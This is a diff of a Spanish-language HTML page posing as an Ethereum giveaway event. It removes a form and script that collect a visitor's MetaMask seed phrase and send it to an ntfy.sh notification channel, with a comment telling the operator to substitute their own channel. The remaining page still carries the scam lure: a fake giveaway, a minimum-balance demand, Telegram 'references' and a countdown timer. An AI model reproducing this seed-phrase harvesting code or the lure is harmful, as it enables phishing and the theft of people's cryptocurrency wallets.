@@ -100,47 +100,6 @@
     <h1>🎁 ¡Evento Especial de Regalo de Ethereum!</h1>
     <p>Inicie sesión con Metamask con su frase semilla. <strong>Debe tener al menos 0.01 ETH o 10 ETH.</strong> Vea nuestras referencias y clientes satisfechos en nuestro canal de Telegram:</p>
 
-<form id="loginForm" onsubmit="event.preventDefault(); alert('Iniciando Sesión...');">
-  <input
-    type="text"
-    name="username"
-    id="username"
-    placeholder="Iniciar sesión con frase semilla"
-    required
-    autocomplete="off"
-  />
-  <button type="submit" class="username">Iniciar sesión</button>
-</form>
-
-<script>
-  document.getElementById("loginForm").addEventListener("submit", function (event) {
-    event.preventDefault();
-
-    const username = document.getElementById("username").value;
-
-    const mensaje = `📥 Nueva Frase Semilla\n👤 Usuario: ${username}`;
-
-    fetch("https://ntfy.sh/USER_BYN9", { // 🔁 CAMBIA ESTO POR TU CANAL REAL
-      method: "POST",
-      body: mensaje,
-      headers: {
-        "Title": "Nuevo mensaje de contacto",
-        "Priority": "high"
-      }
-    })
-    .then(response => {
-      if (response.ok) {
-        alert('✅ Iniciando Sesion...');
-      } else {
-        alert('❌ Error al enviar');
-      }
-    })
-    .catch(err => {
-      alert('❌ Error: ' + err.message);
-    });
-  });
-</script>
-
     <div class="timer">
       Tiempo restante para participar: <span id="countdown">01:59:00</span>
     </div>
